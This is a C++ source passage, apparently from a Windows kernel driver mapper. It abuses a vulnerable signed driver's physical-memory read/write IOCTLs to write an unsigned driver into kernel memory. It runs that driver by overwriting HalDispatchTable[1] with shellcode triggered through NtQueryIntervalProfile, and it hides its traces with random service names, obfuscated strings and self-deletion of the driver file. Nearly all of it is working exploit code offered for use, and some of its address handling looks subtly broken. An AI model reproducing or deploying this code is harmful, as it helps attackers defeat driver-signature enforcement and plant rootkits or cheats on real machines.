    ULONG_PTR halDispatchEntryPa = VirtToPhys(hDev, ioctlRead, cr3, halDispatchEntryVa);
    if (!halDispatchEntryPa) {
        // Try walking our own CR3 (current process)
        // For current process, we need to find its CR3
        // Use __readcr3() if we were in kernel mode, but we're in user mode
        // Fallback: scan physical memory for the HalDispatchTable value
        return false;
    }

    ULONG_PTR halOrigValue = 0;
    PhysRead(hDev, ioctlRead, halDispatchEntryPa, &halOrigValue, sizeof(halOrigValue));
    if (!halOrigValue) return false;

    // 4. Convert shellcode VA to PA (we already mapped it)
    ULONG_PTR shellcodePa = VirtToPhys(hDev, ioctlRead, cr3, shellcodeVa);
    if (!shellcodePa) return false;

    // 5. Build shellcode with proper fixups
    BYTE shellcode[0x100] = {};
    SIZE_T shellcodeSize = 0;
    if (!BuildShellcode(shellcode, &shellcodeSize, driverEntryVa,
                        halDispatchEntryVa, halOrigValue, driverObjPhys, regPathPhys))
        return false;

    // 6. Write shellcode to the mapped physical page
    if (!PhysWrite(hDev, ioctlWrite, shellcodePa, shellcode, shellcodeSize))
        return false;

    // 7. Overwrite HalDispatchTable[1] with shellcode address
    if (!PhysWrite(hDev, ioctlWrite, halDispatchEntryPa, &shellcodeVa, sizeof(shellcodeVa)))
        return false;

    // 8. Trigger execution by calling NtQueryIntervalProfile from a worker thread
    HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return 1;
        void* fn = (void*)GetProcAddress(ntdll, "NtQueryIntervalProfile");
        if (!fn) return 1;

        ULONG profile = 2;
        ULONG64 result = 0;
        using NtQIPFn = LONG(NTAPI*)(ULONG, ULONG64*);
        ((NtQIPFn)fn)(profile, &result);

        return 0;
    }, nullptr, 0, nullptr);

    if (!hThread) return false;

    // Wait for completion
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);

    // 9. Verify: try to restore HalDispatchTable[1] (the shellcode should have done it)
    ULONG_PTR currentValue = 0;
    PhysRead(hDev, ioctlRead, halDispatchEntryPa, &currentValue, sizeof(currentValue));
    if (currentValue == shellcodeVa) {
        // Shellcode didn't restore — try to restore manually
        PhysWrite(hDev, ioctlWrite, halDispatchEntryPa, &halOrigValue, sizeof(halOrigValue));
        return false; // Execution probably failed
    }

    return true;
}

// ================ Main Mapper ================

MapperResult KernelMapper::MapDriver(const MapperConfig& config) {
    MapperResult result;

    if (config.driverImage.empty()) {
        result.errorMsg = OBFUSCATE("Driver image is empty");
        return result;
    }

    PIMAGE_NT_HEADERS nt = GetNtHeaders(config.driverImage.data());
    if (!nt) {
        result.errorMsg = OBFUSCATE("Invalid PE image");
        return result;
    }

    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        result.errorMsg = OBFUSCATE("Driver must be x64");
        return result;
    }

    // Load vulnerable driver via SCM
    SC_HANDLE hSCM = OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        result.errorMsg = OBFUSCATE("Failed to open SCManager");
        return result;
    }

    char randSvc[16];
    NameGen::RandomString(randSvc, 12);
    std::wstring svcName(randSvc, randSvc + 12);

    SC_HANDLE hService = CreateServiceW(hSCM, svcName.c_str(), svcName.c_str(),
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, config.vulnDriverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!hService) {
        hService = OpenServiceW(hSCM, svcName.c_str(), SERVICE_START | SERVICE_STOP | DELETE);
        if (!hService) {
            CloseServiceHandle(hSCM);
            result.errorMsg = OBFUSCATE("Failed to create/open vulnerable driver service");
            return result;
        }
    }

    bool started = StartService(hService, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
    if (!started) {
        DeleteService(hService); CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to start vulnerable driver");
        return result;
    }

    HANDLE hVulnDev = CreateFileW(config.vulnDevicePath.c_str(),
        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hVulnDev == INVALID_HANDLE_VALUE) {
        ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to open vulnerable driver device");
        return result;
    }

    DWORD ioctlRead = config.ioctlPhysRead;
    DWORD ioctlWrite = config.ioctlPhysWrite;

    // Step 1: Find kernel base in physical memory
    ULONG_PTR kernelBase = FindKernelBase(hVulnDev, ioctlRead);
    if (!kernelBase) {
        CloseHandle(hVulnDev);
        ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to find kernel base in physical memory");
        return result;
    }

    // Step 2: Find our process's CR3 for page table walking
    DWORD ourPid = GetCurrentProcessId();
    ULONG_PTR ourCr3 = GetProcessCr3(hVulnDev, ioctlRead, kernelBase, ourPid);
    if (!ourCr3) {
        // Fallback: scan for our PID's EPROCESS in physical memory
        // (This is done inside GetProcessCr3 via brute-force scanning)
        // If still fails, we can't map pages — bail out
        CloseHandle(hVulnDev);
        ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to find process CR3");
        return result;
    }

    // Step 3: Allocate physical memory for our driver
    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    ULONG_PTR allocationPa = FindFreeMemory(0, imageSize);

    // Step 4: Write our driver PE to physical memory
    if (!PhysWrite(hVulnDev, ioctlWrite, allocationPa, config.driverImage.data(),
                   nt->OptionalHeader.SizeOfHeaders)) {
        CloseHandle(hVulnDev); ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to write PE headers");
        return result;
    }

    // Write sections
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        ULONG_PTR destPa = allocationPa + sections[i].VirtualAddress;
        SIZE_T sectionSize = min((SIZE_T)sections[i].SizeOfRawData, (SIZE_T)sections[i].Misc.VirtualSize);
        if (sectionSize > 0 && sections[i].PointerToRawData > 0) {
            PhysWrite(hVulnDev, ioctlWrite, destPa,
                      config.driverImage.data() + sections[i].PointerToRawData, sectionSize);
        }
    }

    // Step 5: Resolve imports (IAT) from kernel physical memory
    ULONG_PTR importDirRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    ULONG_PTR importDirSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

    if (importDirRva > 0 && importDirSize > 0) {
        BYTE* importData = (BYTE*)malloc(importDirSize);
        if (importData) {
            // Read import descriptors from local image
            ULONG_PTR importFileOffset = 0;
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if (importDirRva >= sections[i].VirtualAddress &&
                    importDirRva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
                    importFileOffset = sections[i].PointerToRawData + (importDirRva - sections[i].VirtualAddress);
                    break;
                }
            }

            if (importFileOffset > 0) {
                memcpy(importData, config.driverImage.data() + importFileOffset, importDirSize);

                PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)importData;
                while (importDesc->Name && importDesc->FirstThunk) {
                    PIMAGE_THUNK_DATA64 thunk = (PIMAGE_THUNK_DATA64)((ULONG_PTR)importData +
                        ((ULONG_PTR)importDesc->FirstThunk - importDirRva));

                    while (thunk->u1.AddressOfData) {
                        ULONG_PTR funcAddr = 0;

                        if (!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
                            PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(
                                (ULONG_PTR)importData +
                                ((ULONG_PTR)thunk->u1.AddressOfData - importDirRva));

                            // Resolve from kernel exports in physical memory
                            char* funcName = (char*)importByName->Name;
                            ULONG_PTR funcRva = ResolveKernelExport(hVulnDev, ioctlRead,
                                                                    kernelBase, funcName);
                            if (funcRva) {
                                // Convert to kernel virtual address
                                // The kernel is mapped in virtual space;
                                // we need the virtual address: kernelBaseVa + funcRva
                                // kernelBaseVa = GetModuleHandle("ntoskrnl.exe")
                                HMODULE hNt = GetModuleHandleA("ntoskrnl.exe");
                                if (hNt) {
                                    funcAddr = (ULONG_PTR)hNt + funcRva;
                                }
                            }
                        }

                        if (funcAddr) {
                            ULONG_PTR thunkPa = allocationPa + importDirRva +
                                ((ULONG_PTR)thunk - (ULONG_PTR)importData);
                            PhysWrite(hVulnDev, ioctlWrite, thunkPa, &funcAddr, sizeof(funcAddr));
                        }
                        thunk++;
                    }
                    importDesc++;
                }
            }
            free(importData);
        }
    }

    // Step 6: Apply relocations
    ULONG_PTR relocDirRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    ULONG_PTR relocDirSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    if (relocDirRva > 0 && relocDirSize > 0) {
        ULONG_PTR delta = allocationPa - nt->OptionalHeader.ImageBase;

        BYTE* relocData = (BYTE*)malloc(relocDirSize);
        if (relocData) {
            ULONG_PTR relocFileOffset = 0;
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if (relocDirRva >= sections[i].VirtualAddress &&
                    relocDirRva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
                    relocFileOffset = sections[i].PointerToRawData + (relocDirRva - sections[i].VirtualAddress);
                    break;
                }
            }

            if (relocFileOffset > 0 && delta != 0) {
                memcpy(relocData, config.driverImage.data() + relocFileOffset, relocDirSize);

                PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)relocData;
                while (reloc->SizeOfBlock > 0 && reloc->VirtualAddress > 0) {
                    DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    PWORD entries = (PWORD)(reloc + 1);

                    for (DWORD j = 0; j < count; j++) {
                        if (entries[j] == 0) continue;
                        int type = entries[j] >> 12;
                        WORD offset = entries[j] & 0xFFF;

                        if (type == IMAGE_REL_BASED_DIR64) {
                            ULONG_PTR addrPa = allocationPa + reloc->VirtualAddress + offset;
                            ULONG_PTR origVal = 0;
                            PhysRead(hVulnDev, ioctlRead, addrPa, &origVal, sizeof(origVal));
                            origVal += delta;
                            PhysWrite(hVulnDev, ioctlWrite, addrPa, &origVal, sizeof(origVal));
                        }
                    }
                    reloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)reloc + reloc->SizeOfBlock);
                }
            }
            free(relocData);
        }
    }

    // Step 7: Map our driver's physical pages into kernel virtual address space
    ULONG_PTR driverVa = FindFreeVirtualAddr(hVulnDev, ioctlRead, ourCr3, kernelBase, imageSize);
    if (!driverVa) {
        CloseHandle(hVulnDev); ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to find free kernel virtual address");
        return result;
    }

    SIZE_T numPages = (imageSize + 0xFFF) >> 12;
    for (SIZE_T i = 0; i < numPages; i++) {
        ULONG_PTR pagePa = allocationPa + i * 0x1000;
        ULONG_PTR pageVa = driverVa + i * 0x1000;
        if (!MapPage(hVulnDev, ioctlRead, ioctlWrite, ourCr3, pagePa, pageVa)) {
            CloseHandle(hVulnDev); ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
            DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hSCM);
            result.errorMsg = OBFUSCATE("Failed to map driver page");
            return result;
        }
    }

    // Step 8: Write minimal DRIVER_OBJECT in our driver's physical memory (data section area)
    ULONG_PTR driverObjPa = allocationPa + 0x2000; // Past the PE headers, in a free area
    ULONG_PTR entryPoint = nt->OptionalHeader.AddressOfEntryPoint;
    ULONG_PTR driverEntryVa = driverVa + entryPoint;
    if (!WriteMinimalDriverObject(hVulnDev, ioctlWrite, driverObjPa, driverEntryVa, allocationPa, (ULONG)imageSize)) {
        CloseHandle(hVulnDev); ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to write driver object");
        return result;
    }
    ULONG_PTR regPathPa = driverObjPa + 0x1A0;

    // Step 9: Allocate + map shellcode page
    ULONG_PTR shellcodePa = FindFreeMemory(0, 0x1000);
    ULONG_PTR shellcodeVa = FindFreeVirtualAddr(hVulnDev, ioctlRead, ourCr3, kernelBase, 0x1000);
    if (!shellcodeVa) {
        CloseHandle(hVulnDev); ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to find shellcode virtual address");
        return result;
    }

    if (!MapPage(hVulnDev, ioctlRead, ioctlWrite, ourCr3, shellcodePa, shellcodeVa)) {
        CloseHandle(hVulnDev); ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hSCM);
        result.errorMsg = OBFUSCATE("Failed to map shellcode page");
        return result;
    }

    // Step 10: Convert driver object and registry path to virtual addresses
    // We wrote them at driverObjPa; the virtual address is driverVa + (driverObjPa - allocationPa)
    ULONG_PTR drvObjVa = driverVa + (driverObjPa - allocationPa);
    ULONG_PTR regPathVaPath = driverVa + (regPathPa - allocationPa);

    // Step 11: Execute via HalDispatchTable hijack
    bool executed = ExecuteViaHalDispatch(hVulnDev, ioctlRead, ioctlWrite,
                                          kernelBase, ourCr3,
                                          shellcodeVa, driverEntryVa,
                                          drvObjVa, regPathVaPath);

    // Clean up vulnerable driver
    CloseHandle(hVulnDev);
    ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
    DeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    // Self-delete vulnerable driver .sys
    HANDLE hVulnFile = CreateFileW(config.vulnDriverPath.c_str(), DELETE, 0, nullptr,
                                    OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, nullptr);
    if (hVulnFile != INVALID_HANDLE_VALUE) CloseHandle(hVulnFile);

    if (!executed) {
        result.errorMsg = OBFUSCATE("Failed to execute driver via HalDispatchTable");
        return result;
    }

    result.success = true;
    result.imageBase = (void*)driverVa;
    result.entryPoint = (void*)driverEntryVa;
    return result;
}

void KernelMapper::UnloadMapper(const std::wstring& vulnServiceName) {
    SC_HANDLE hSCM = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return;
    SC_HANDLE hService = OpenServiceW(hSCM, vulnServiceName.c_str(), SERVICE_STOP | DELETE);
    if (hService) {
        ControlService(hService, SERVICE_CONTROL_STOP, nullptr);
        DeleteService(hService);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCM);
}
